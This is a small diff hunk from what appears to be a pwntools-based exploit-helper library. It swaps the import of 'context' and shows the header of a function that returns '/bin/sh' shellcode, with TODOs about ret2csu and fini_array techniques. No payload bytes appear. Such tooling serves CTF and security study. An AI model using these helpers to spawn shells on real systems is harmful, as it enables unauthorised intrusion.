@@ -3,7 +3,7 @@ that are repeated enough to justify existing as an
 automated script.'''
 # TODO: see if ret2csu gets pushed to pwntools-dev. If not...
 # TODO: fini_arr.
-from pwn import context
+from pwnscripts.context import context
 def sh() -> bytes:
     '''Shorter shellcode, in case program limits require it
     Returns: bytestring of '/bin/sh' shellcode based on context.arch'''
